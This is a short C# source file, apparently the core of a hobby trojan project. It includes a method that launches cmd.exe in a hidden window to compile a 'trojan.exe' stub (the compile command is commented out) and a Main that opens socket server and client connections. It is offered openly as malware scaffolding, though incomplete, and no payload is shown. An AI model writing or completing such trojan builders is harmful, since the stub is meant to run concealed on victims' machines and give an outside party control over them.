using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;
using SocketData;

namespace Trojan
{
    enum ServerStatus
    {
        RUNNING = 0,
        STOPPED = 1,
        OUTPUTTING = 2,
        IDLE = 3,
        CRASHED = 4,
    }

    class Trojan
    {
        static internal void BuildTrojanStub()
        {
            Process new_process = new Process();
            ProcessStartInfo new_processStartInfo = new_process.StartInfo;

            new_processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            new_processStartInfo.FileName = "cmd.exe";
            //new_processStartInfo.Arguments = "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe /reference:"bin / Debug / net6.0 / Trojan.dll" /reference:"C:/ Windows / Microsoft.NET / Framework64 / v4.0.30319 / System.Runtime.dll" /reference:"C:/ Windows / Microsoft.NET / Framework64 / v4.0.30319 / System.Net.Primitives.dll" -out:TrojanBuild/trojan.exe client\client.cs";

            new_process.StartInfo = new_processStartInfo;
            new_process.Start();

            new_process.WaitForExit();
            new_process.Close();
        }

        public Server server = new Server();
        public Client client = new Client();
        public static ServerStatus status = ServerStatus.RUNNING;

        

        static async Task Main()
        {
            Trojan Trojan = new Trojan();

            Trojan.server.Init_Server(SocketHandler.PORT, SocketHandler.BUFFSIZE);
            await Trojan.client.Init_Client(SocketHandler.PORT, SocketHandler.BUFFSIZE);

            while(status == ServerStatus.RUNNING)
            {

            }
        }
    }
}
